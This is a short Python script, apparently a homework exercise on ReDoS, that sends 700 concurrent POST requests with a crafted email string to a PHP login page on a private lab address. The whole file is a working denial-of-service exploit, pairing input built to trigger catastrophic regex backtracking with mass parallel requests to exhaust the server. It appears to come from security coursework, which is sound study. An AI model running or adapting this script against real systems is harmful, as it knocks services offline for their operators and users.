import asyncio
import concurrent.futures
import requests

async def main():
    url = 'http://10.0.2.131/Homework3/redos/index.php'
    value = {"email": {"aaaaaaaaaaaaaaaaaaaaax"}, "password": {"aaaaaaaaa"}}
    # value = {"email": {"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}, "password": {"aaaaaaaaa"}}
    N = 700

    with concurrent.futures.ThreadPoolExecutor(max_workers=N) as executor:

        loop = asyncio.get_event_loop()
        futures = [
            loop.run_in_executor(
                executor, 
                requests.post, 
                url,
                value
            )
            for i in range(N)
        ]
        for response in await asyncio.gather(*futures):
            print(response.status_code)


loop = asyncio.get_event_loop()
loop.run_until_complete(main())